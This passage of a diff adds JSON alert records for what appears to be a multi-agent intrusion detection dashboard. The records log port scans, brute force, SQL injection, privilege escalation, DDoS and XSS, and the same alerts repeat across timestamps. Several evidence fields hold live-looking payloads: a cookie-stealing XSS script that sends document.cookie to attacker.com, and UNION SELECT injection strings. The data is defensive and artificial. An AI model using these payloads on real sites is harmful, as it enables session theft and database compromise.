+        "Detection Method: Failed Authentication Thresholding",
+        "Severity Rule: Active Exploitation & Credential Abuse (Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 84/100. Factors: Exploitation pattern detected: BRUTE_FORCE.)"
+      ],
+      "id": "ALT-1789665961792-8e1q6",
+      "createdAt": "2026-09-17T17:26:01.792Z"
+    },
+    {
+      "alertId": "ALT-961786-8HOS",
+      "incidentId": "INC-20260917-WZ1A6",
+      "title": "SYN Port Sweep",
+      "description": "Distributed port scan targeting ports 22, 80, 443, 8080, 3389 within 2 seconds",
+      "alertType": "PORT_SCAN",
+      "severity": "HIGH",
+      "riskScore": 76,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "SYN packets without ACK completion",
+        "5 distinct ports scanned in 200ms",
+        "Entropy: 0.94",
+        "Agent: NetworkAgent",
+        "Detection Method: Port Frequency & Packet Entropy Engine",
+        "Severity Rule: Active Exploitation & Credential Abuse (Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 76/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789665961787-8d61t",
+      "createdAt": "2026-09-17T17:26:01.787Z"
+    },
+    {
+      "alertId": "ALT-932590-FH5U",
+      "incidentId": "INC-20260917-WDZIO",
+      "title": "XSS_ATTACK",
+      "description": "Reflected XSS attempt <script>alert(\"XSS\")</script>",
+      "alertType": "XSS_ATTACK",
+      "severity": "CRITICAL",
+      "riskScore": 85,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "<script>document.location=\"http://attacker.com/steal?cookie=\"+document.cookie</script>",
+        "Agent: ApplicationAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 85/100 with .)"
+      ],
+      "id": "ALT-1789665932591-32kfc",
+      "createdAt": "2026-09-17T17:25:32.591Z"
+    },
+    {
+      "alertId": "ALT-932587-LHTE",
+      "incidentId": "INC-20260917-K1R7K",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "alertType": "PORT_SCAN",
+      "severity": "MEDIUM",
+      "riskScore": 60,
+      "priority": "P3",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Agent: NetworkAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Anomalous Behavior & Port Reconnaissance (Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789665932588-x0ltn",
+      "createdAt": "2026-09-17T17:25:32.588Z"
+    },
+    {
+      "alertId": "ALT-932584-AT73",
+      "incidentId": "INC-20260917-YGIF6",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "alertType": "PORT_SCAN",
+      "severity": "MEDIUM",
+      "riskScore": 60,
+      "priority": "P3",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Agent: NetworkAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Anomalous Behavior & Port Reconnaissance (Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789665932585-21u9v",
+      "createdAt": "2026-09-17T17:25:32.585Z"
+    },
+    {
+      "alertId": "ALT-932581-YCT9",
+      "incidentId": "INC-20260917-5RZIK",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "alertType": "PORT_SCAN",
+      "severity": "MEDIUM",
+      "riskScore": 60,
+      "priority": "P3",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Agent: NetworkAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Anomalous Behavior & Port Reconnaissance (Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789665932582-5u0hd",
+      "createdAt": "2026-09-17T17:25:32.582Z"
+    },
+    {
+      "title": "[SystemAgent] Brute Force Attack",
+      "description": "Multiple repeated authentication failures (4 failed attempts) from 203.0.113.50.",
+      "alertType": "Brute Force Attack",
+      "severity": "MEDIUM",
+      "riskScore": 85,
+      "priority": "P3",
+      "mitreTechniques": [
+        "T1110"
+      ],
+      "evidence": [
+        "4 failed SSH/auth attempts detected within sequence"
+      ],
+      "id": "ALT-25603308",
+      "alertId": "ALT-25603308",
+      "createdAt": "2026-09-17T17:25:32.560Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[NetworkAgent] Port Scanning",
+      "description": "Rapid port sweep detected across 5 destination ports from host 203.0.113.50.",
+      "alertType": "Port Scanning",
+      "severity": "HIGH",
+      "riskScore": 90,
+      "priority": "P2",
+      "mitreTechniques": [
+        "T1046"
+      ],
+      "evidence": [
+        "Scanned ports: 22, 80, 443, 3306, 5432"
+      ],
+      "id": "ALT-25594741",
+      "alertId": "ALT-25594741",
+      "createdAt": "2026-09-17T17:25:32.559Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[ApplicationAgent] Suspicious URL Access",
+      "description": "Unauthorized probing of administrative endpoint.",
+      "alertType": "Suspicious URL Access",
+      "severity": "MEDIUM",
+      "riskScore": 70,
+      "priority": "P3",
+      "mitreTechniques": [
+        "T1595"
+      ],
+      "evidence": [
+        "2026-09-17T11:02:05Z 203.0.113.50 GET /admin/console HTTP/1.1 403 text/html"
+      ],
+      "id": "ALT-25593738",
+      "alertId": "ALT-25593738",
+      "createdAt": "2026-09-17T17:25:32.559Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[ApplicationAgent] SQL Injection",
+      "description": "SQL injection payload detected aiming at database enumeration or bypass.",
+      "alertType": "SQL Injection",
+      "severity": "CRITICAL",
+      "riskScore": 95,
+      "priority": "P1",
+      "mitreTechniques": [
+        "T1190"
+      ],
+      "evidence": [
+        "2026-09-17T11:02:01Z 203.0.113.50 POST /api/data HTTP/1.1 200 application/json body=1' UNION SELECT * FROM users--"
+      ],
+      "id": "ALT-25596188",
+      "alertId": "ALT-25596188",
+      "createdAt": "2026-09-17T17:25:32.559Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[SystemAgent] Privilege Escalation",
+      "description": "Administrative root shell acquired via sudo execution.",
+      "alertType": "Privilege Escalation",
+      "severity": "HIGH",
+      "riskScore": 92,
+      "priority": "P2",
+      "mitreTechniques": [
+        "T1548.003"
+      ],
+      "evidence": [
+        "Sep 17 11:01:11 server01 sudo: admin : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/bin/bash"
+      ],
+      "id": "ALT-25585916",
+      "alertId": "ALT-25585916",
+      "createdAt": "2026-09-17T17:25:32.558Z",
+      "status": "NEW"
+    },
+    {
+      "alertId": "ALT-932549-2DJN",
+      "incidentId": "INC-20260917-LTLNP",
+      "title": "UDP Amplification Storm",
+      "description": "Bandwidth threshold exceeded: 1.2M pps from 198.51.100.111",
+      "alertType": "DDoS_FLOOD",
+      "severity": "CRITICAL",
+      "riskScore": 88,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Packet rate: 1.2M pps",
+        "Entropy: 0.98",
+        "Destination Port: 53",
+        "Agent: ThreatDetectionAgent",
+        "Detection Method: Isolation Forest Volumetric Anomaly",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 88/100 with .)"
+      ],
+      "id": "ALT-1789665932550-f3hpe",
+      "createdAt": "2026-09-17T17:25:32.550Z"
+    },
+    {
+      "alertId": "ALT-932537-3MZJ",
+      "incidentId": "INC-20260917-MONDL",
+      "title": "Lateral Movement & Reconnaissance Sequence",
+      "description": "Correlated event sequence: Port Scan -> SSH Brute Force -> Web Exploit",
+      "alertType": "MULTI_STAGE_KILLCHAIN",
+      "severity": "CRITICAL",
+      "riskScore": 95,
+      "priority": "P1",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Stage 1: Reconnaissance (NetworkAgent)",
+        "Stage 2: Initial Access (SystemAgent)",
+        "Stage 3: Persistence",
+        "Agent: CorrelationAgent",
+        "Detection Method: Multi-Agent Temporal Sliding Window",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 95/100 with Cross-Agent correlation active (NetworkAgent, SystemAgent, ApplicationAgent); Critical threat classification: MULTI_STAGE_KILLCHAIN.)"
+      ],
+      "id": "ALT-1789665932538-8lttl",
+      "createdAt": "2026-09-17T17:25:32.538Z"
+    },
+    {
+      "alertId": "ALT-932533-N3E9",
+      "incidentId": "INC-20260917-SPROJ",
+      "title": "SQL Injection via Web Parameter",
+      "description": "SQL injection attempt in GET /api/products?id=1%20UNION%20SELECT",
+      "alertType": "SQL_INJECTION",
+      "severity": "CRITICAL",
+      "riskScore": 92,
+      "priority": "P1",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Pattern detected: UNION SELECT",
+        "HTTP 500 error triggered on downstream database",
+        "Agent: ApplicationAgent",
+        "Detection Method: Regex Signature & AST Anomaly Analyzer",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 92/100 with Exploitation pattern detected: SQL_INJECTION.)"
+      ],
+      "id": "ALT-1789665932534-obp3l",
+      "createdAt": "2026-09-17T17:25:32.534Z"
+    },
+    {
+      "alertId": "ALT-932528-BKXN",
+      "incidentId": "INC-20260917-FAONI",
+      "title": "SSH Credential Brute Force",
+      "description": "Rapid failed authentication attempts exceeding 30 attempts per minute",
+      "alertType": "BRUTE_FORCE",
+      "severity": "HIGH",
+      "riskScore": 84,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Account: root, admin, test",
+        "34 failed password attempts in 45s",
+        "Agent: SystemAgent",
+        "Detection Method: Failed Authentication Thresholding",
+        "Severity Rule: Active Exploitation & Credential Abuse (Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 84/100. Factors: Exploitation pattern detected: BRUTE_FORCE.)"
+      ],
+      "id": "ALT-1789665932529-81jef",
+      "createdAt": "2026-09-17T17:25:32.529Z"
+    },
+    {
+      "alertId": "ALT-932522-BKUP",
+      "incidentId": "INC-20260917-51P9G",
+      "title": "SYN Port Sweep",
+      "description": "Distributed port scan targeting ports 22, 80, 443, 8080, 3389 within 2 seconds",
+      "alertType": "PORT_SCAN",
+      "severity": "HIGH",
+      "riskScore": 76,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "SYN packets without ACK completion",
+        "5 distinct ports scanned in 200ms",
+        "Entropy: 0.94",
+        "Agent: NetworkAgent",
+        "Detection Method: Port Frequency & Packet Entropy Engine",
+        "Severity Rule: Active Exploitation & Credential Abuse (Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 76/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789665932523-clfu1",
+      "createdAt": "2026-09-17T17:25:32.523Z"
+    },
+    {
+      "alertId": "ALT-925459-LUA5",
+      "incidentId": "INC-20260917-83779",
+      "title": "XSS_ATTACK",
+      "description": "Reflected XSS attempt <script>alert(\"XSS\")</script>",
+      "alertType": "XSS_ATTACK",
+      "severity": "CRITICAL",
+      "riskScore": 85,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "<script>document.location=\"http://attacker.com/steal?cookie=\"+document.cookie</script>",
+        "Agent: ApplicationAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 85/100 with .)"
+      ],
+      "id": "ALT-1789665925460-t78ni",
+      "createdAt": "2026-09-17T17:25:25.460Z"
+    },
+    {
+      "alertId": "ALT-925457-JC6B",
+      "incidentId": "INC-20260917-VAOGC",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "alertType": "PORT_SCAN",
+      "severity": "MEDIUM",
+      "riskScore": 60,
+      "priority": "P3",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Agent: NetworkAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Anomalous Behavior & Port Reconnaissance (Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789665925457-qcp3b",
+      "createdAt": "2026-09-17T17:25:25.457Z"
+    },
+    {
+      "alertId": "ALT-925454-D90S",
+      "incidentId": "INC-20260917-0FED5",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "alertType": "PORT_SCAN",
+      "severity": "MEDIUM",
+      "riskScore": 60,
+      "priority": "P3",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Agent: NetworkAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Anomalous Behavior & Port Reconnaissance (Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789665925455-p44zz",
+      "createdAt": "2026-09-17T17:25:25.455Z"
+    },
+    {
+      "alertId": "ALT-925451-7TCY",
+      "incidentId": "INC-20260917-P4K1Z",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "alertType": "PORT_SCAN",
+      "severity": "MEDIUM",
+      "riskScore": 60,
+      "priority": "P3",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Agent: NetworkAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Anomalous Behavior & Port Reconnaissance (Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789665925452-g7aw8",
+      "createdAt": "2026-09-17T17:25:25.452Z"
+    },
+    {
+      "title": "[SystemAgent] Brute Force Attack",
+      "description": "Multiple repeated authentication failures (4 failed attempts) from 203.0.113.50.",
+      "alertType": "Brute Force Attack",
+      "severity": "MEDIUM",
+      "riskScore": 85,
+      "priority": "P3",
+      "mitreTechniques": [
+        "T1110"
+      ],
+      "evidence": [
+        "4 failed SSH/auth attempts detected within sequence"
+      ],
+      "id": "ALT-54368433",
+      "alertId": "ALT-54368433",
+      "createdAt": "2026-09-17T17:25:25.436Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[NetworkAgent] Port Scanning",
+      "description": "Rapid port sweep detected across 5 destination ports from host 203.0.113.50.",
+      "alertType": "Port Scanning",
+      "severity": "HIGH",
+      "riskScore": 90,
+      "priority": "P2",
+      "mitreTechniques": [
+        "T1046"
+      ],
+      "evidence": [
+        "Scanned ports: 22, 80, 443, 3306, 5432"
+      ],
+      "id": "ALT-54359350",
+      "alertId": "ALT-54359350",
+      "createdAt": "2026-09-17T17:25:25.435Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[ApplicationAgent] Suspicious URL Access",
+      "description": "Unauthorized probing of administrative endpoint.",
+      "alertType": "Suspicious URL Access",
+      "severity": "MEDIUM",
+      "riskScore": 70,
+      "priority": "P3",
+      "mitreTechniques": [
+        "T1595"
+      ],
+      "evidence": [
+        "2026-09-17T11:02:05Z 203.0.113.50 GET /admin/console HTTP/1.1 403 text/html"
+      ],
+      "id": "ALT-54341923",
+      "alertId": "ALT-54341923",
+      "createdAt": "2026-09-17T17:25:25.434Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[ApplicationAgent] SQL Injection",
+      "description": "SQL injection payload detected aiming at database enumeration or bypass.",
+      "alertType": "SQL Injection",
+      "severity": "CRITICAL",
+      "riskScore": 95,
+      "priority": "P1",
+      "mitreTechniques": [
+        "T1190"
+      ],
+      "evidence": [
+        "2026-09-17T11:02:01Z 203.0.113.50 POST /api/data HTTP/1.1 200 application/json body=1' UNION SELECT * FROM users--"
+      ],
+      "id": "ALT-54348858",
+      "alertId": "ALT-54348858",
+      "createdAt": "2026-09-17T17:25:25.434Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[SystemAgent] Privilege Escalation",
+      "description": "Administrative root shell acquired via sudo execution.",
+      "alertType": "Privilege Escalation",
+      "severity": "HIGH",
+      "riskScore": 92,
+      "priority": "P2",
+      "mitreTechniques": [
+        "T1548.003"
+      ],
+      "evidence": [
+        "Sep 17 11:01:11 server01 sudo: admin : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/bin/bash"
+      ],
+      "id": "ALT-54344493",
+      "alertId": "ALT-54344493",
+      "createdAt": "2026-09-17T17:25:25.434Z",
+      "status": "NEW"
+    },
+    {
+      "alertId": "ALT-925429-5ZMC",
+      "incidentId": "INC-20260917-0ZODZ",
+      "title": "UDP Amplification Storm",
+      "description": "Bandwidth threshold exceeded: 1.2M pps from 198.51.100.111",
+      "alertType": "DDoS_FLOOD",
+      "severity": "CRITICAL",
+      "riskScore": 88,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Packet rate: 1.2M pps",
+        "Entropy: 0.98",
+        "Destination Port: 53",
+        "Agent: ThreatDetectionAgent",
+        "Detection Method: Isolation Forest Volumetric Anomaly",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 88/100 with .)"
+      ],
+      "id": "ALT-1789665925429-p1onq",
+      "createdAt": "2026-09-17T17:25:25.429Z"
+    },
+    {
+      "alertId": "ALT-925419-530D",
+      "incidentId": "INC-20260917-YQK26",
+      "title": "Lateral Movement & Reconnaissance Sequence",
+      "description": "Correlated event sequence: Port Scan -> SSH Brute Force -> Web Exploit",
+      "alertType": "MULTI_STAGE_KILLCHAIN",
+      "severity": "CRITICAL",
+      "riskScore": 95,
+      "priority": "P1",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Stage 1: Reconnaissance (NetworkAgent)",
+        "Stage 2: Initial Access (SystemAgent)",
+        "Stage 3: Persistence",
+        "Agent: CorrelationAgent",
+        "Detection Method: Multi-Agent Temporal Sliding Window",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 95/100 with Cross-Agent correlation active (NetworkAgent, SystemAgent, ApplicationAgent); Critical threat classification: MULTI_STAGE_KILLCHAIN.)"
+      ],
+      "id": "ALT-1789665925420-0pl2d",
+      "createdAt": "2026-09-17T17:25:25.420Z"
+    },
+    {
+      "alertId": "ALT-925416-JERF",
+      "incidentId": "INC-20260917-FFZ3R",
+      "title": "SQL Injection via Web Parameter",
+      "description": "SQL injection attempt in GET /api/products?id=1%20UNION%20SELECT",
+      "alertType": "SQL_INJECTION",
+      "severity": "CRITICAL",
+      "riskScore": 92,
+      "priority": "P1",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Pattern detected: UNION SELECT",
+        "HTTP 500 error triggered on downstream database",
+        "Agent: ApplicationAgent",
+        "Detection Method: Regex Signature & AST Anomaly Analyzer",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 92/100 with Exploitation pattern detected: SQL_INJECTION.)"
+      ],
+      "id": "ALT-1789665925417-irlv8",
+      "createdAt": "2026-09-17T17:25:25.417Z"
+    },
+    {
+      "alertId": "ALT-925412-SLC9",
+      "incidentId": "INC-20260917-2EQQ0",
+      "title": "SSH Credential Brute Force",
+      "description": "Rapid failed authentication attempts exceeding 30 attempts per minute",
+      "alertType": "BRUTE_FORCE",
+      "severity": "HIGH",
+      "riskScore": 84,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Account: root, admin, test",
+        "34 failed password attempts in 45s",
+        "Agent: SystemAgent",
+        "Detection Method: Failed Authentication Thresholding",
+        "Severity Rule: Active Exploitation & Credential Abuse (Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 84/100. Factors: Exploitation pattern detected: BRUTE_FORCE.)"
+      ],
+      "id": "ALT-1789665925413-sdits",
+      "createdAt": "2026-09-17T17:25:25.413Z"
+    },
+    {
+      "alertId": "ALT-925409-1TZP",
+      "incidentId": "INC-20260917-6621T",
+      "title": "SYN Port Sweep",
+      "description": "Distributed port scan targeting ports 22, 80, 443, 8080, 3389 within 2 seconds",
+      "alertType": "PORT_SCAN",
+      "severity": "HIGH",
+      "riskScore": 76,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "SYN packets without ACK completion",
+        "5 distinct ports scanned in 200ms",
+        "Entropy: 0.94",
+        "Agent: NetworkAgent",
+        "Detection Method: Port Frequency & Packet Entropy Engine",
+        "Severity Rule: Active Exploitation & Credential Abuse (Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 76/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789665925409-1cvn3",
+      "createdAt": "2026-09-17T17:25:25.409Z"
+    },
+    {
+      "alertId": "ALT-905577-4V41",
+      "incidentId": "INC-20260917-8D1Y9",
+      "title": "XSS_ATTACK",
+      "description": "Reflected XSS attempt <script>alert(\"XSS\")</script>",
+      "alertType": "XSS_ATTACK",
+      "severity": "CRITICAL",
+      "riskScore": 85,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "<script>document.location=\"http://attacker.com/steal?cookie=\"+document.cookie</script>",
+        "Agent: ApplicationAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 85/100 with .)"
+      ],
+      "id": "ALT-1789665905578-imqxd",
+      "createdAt": "2026-09-17T17:25:05.578Z"
+    },
+    {
+      "alertId": "ALT-905574-9UVK",
+      "incidentId": "INC-20260917-S6YCX",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "alertType": "PORT_SCAN",
+      "severity": "MEDIUM",
+      "riskScore": 60,
+      "priority": "P3",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Agent: NetworkAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Anomalous Behavior & Port Reconnaissance (Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789665905575-hmy7b",
+      "createdAt": "2026-09-17T17:25:05.575Z"
+    },
+    {
+      "alertId": "ALT-905572-61S5",
+      "incidentId": "INC-20260917-9L8NH",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "alertType": "PORT_SCAN",
+      "severity": "MEDIUM",
+      "riskScore": 60,
+      "priority": "P3",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Agent: NetworkAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Anomalous Behavior & Port Reconnaissance (Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789665905572-ajlmp",
+      "createdAt": "2026-09-17T17:25:05.572Z"
+    },
+    {
+      "alertId": "ALT-905569-YL7D",
+      "incidentId": "INC-20260917-52HFJ",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "alertType": "PORT_SCAN",
+      "severity": "MEDIUM",
+      "riskScore": 60,
+      "priority": "P3",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Agent: NetworkAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Anomalous Behavior & Port Reconnaissance (Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789665905570-js95z",
+      "createdAt": "2026-09-17T17:25:05.570Z"
+    },
+    {
+      "title": "[SystemAgent] Brute Force Attack",
+      "description": "Multiple repeated authentication failures (4 failed attempts) from 203.0.113.50.",
+      "alertType": "Brute Force Attack",
+      "severity": "MEDIUM",
+      "riskScore": 85,
+      "priority": "P3",
+      "mitreTechniques": [
+        "T1110"
+      ],
+      "evidence": [
+        "4 failed SSH/auth attempts detected within sequence"
+      ],
+      "id": "ALT-55482521",
+      "alertId": "ALT-55482521",
+      "createdAt": "2026-09-17T17:25:05.548Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[NetworkAgent] Port Scanning",
+      "description": "Rapid port sweep detected across 5 destination ports from host 203.0.113.50.",
+      "alertType": "Port Scanning",
+      "severity": "HIGH",
+      "riskScore": 90,
+      "priority": "P2",
+      "mitreTechniques": [
+        "T1046"
+      ],
+      "evidence": [
+        "Scanned ports: 22, 80, 443, 3306, 5432"
+      ],
+      "id": "ALT-55475416",
+      "alertId": "ALT-55475416",
+      "createdAt": "2026-09-17T17:25:05.547Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[ApplicationAgent] Suspicious URL Access",
+      "description": "Unauthorized probing of administrative endpoint.",
+      "alertType": "Suspicious URL Access",
+      "severity": "MEDIUM",
+      "riskScore": 70,
+      "priority": "P3",
+      "mitreTechniques": [
+        "T1595"
+      ],
+      "evidence": [
+        "2026-09-17T11:02:05Z 203.0.113.50 GET /admin/console HTTP/1.1 403 text/html"
+      ],
+      "id": "ALT-55472739",
+      "alertId": "ALT-55472739",
+      "createdAt": "2026-09-17T17:25:05.547Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[ApplicationAgent] SQL Injection",
+      "description": "SQL injection payload detected aiming at database enumeration or bypass.",
+      "alertType": "SQL Injection",
+      "severity": "CRITICAL",
+      "riskScore": 95,
+      "priority": "P1",
+      "mitreTechniques": [
+        "T1190"
+      ],
+      "evidence": [
+        "2026-09-17T11:02:01Z 203.0.113.50 POST /api/data HTTP/1.1 200 application/json body=1' UNION SELECT * FROM users--"
+      ],
+      "id": "ALT-55479212",
+      "alertId": "ALT-55479212",
+      "createdAt": "2026-09-17T17:25:05.547Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[SystemAgent] Privilege Escalation",
+      "description": "Administrative root shell acquired via sudo execution.",
+      "alertType": "Privilege Escalation",
+      "severity": "HIGH",
+      "riskScore": 92,
+      "priority": "P2",
+      "mitreTechniques": [
+        "T1548.003"
+      ],
+      "evidence": [
+        "Sep 17 11:01:11 server01 sudo: admin : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/bin/bash"
+      ],
+      "id": "ALT-55464110",
+      "alertId": "ALT-55464110",
+      "createdAt": "2026-09-17T17:25:05.546Z",
+      "status": "NEW"
+    },
+    {
+      "alertId": "ALT-905538-K7LK",
+      "incidentId": "INC-20260917-W9VJM",
+      "title": "UDP Amplification Storm",
+      "description": "Bandwidth threshold exceeded: 1.2M pps from 198.51.100.111",
+      "alertType": "DDoS_FLOOD",
+      "severity": "CRITICAL",
+      "riskScore": 88,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Packet rate: 1.2M pps",
+        "Entropy: 0.98",
+        "Destination Port: 53",
+        "Agent: ThreatDetectionAgent",
+        "Detection Method: Isolation Forest Volumetric Anomaly",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 88/100 with .)"
+      ],
+      "id": "ALT-1789665905539-9knu8",
+      "createdAt": "2026-09-17T17:25:05.539Z"
+    },
+    {
+      "alertId": "ALT-905527-3X7D",
+      "incidentId": "INC-20260917-1PQ00",
+      "title": "Lateral Movement & Reconnaissance Sequence",
+      "description": "Correlated event sequence: Port Scan -> SSH Brute Force -> Web Exploit",
+      "alertType": "MULTI_STAGE_KILLCHAIN",
+      "severity": "CRITICAL",
+      "riskScore": 95,
+      "priority": "P1",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Stage 1: Reconnaissance (NetworkAgent)",
+        "Stage 2: Initial Access (SystemAgent)",
+        "Stage 3: Persistence",
+        "Agent: CorrelationAgent",
+        "Detection Method: Multi-Agent Temporal Sliding Window",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 95/100 with Cross-Agent correlation active (NetworkAgent, SystemAgent, ApplicationAgent); Critical threat classification: MULTI_STAGE_KILLCHAIN.)"
+      ],
+      "id": "ALT-1789665905528-hb7v2",
+      "createdAt": "2026-09-17T17:25:05.528Z"
+    },
+    {
+      "alertId": "ALT-905524-VBL9",
+      "incidentId": "INC-20260917-C7HI3",
+      "title": "SQL Injection via Web Parameter",
+      "description": "SQL injection attempt in GET /api/products?id=1%20UNION%20SELECT",
+      "alertType": "SQL_INJECTION",
+      "severity": "CRITICAL",
+      "riskScore": 92,
+      "priority": "P1",
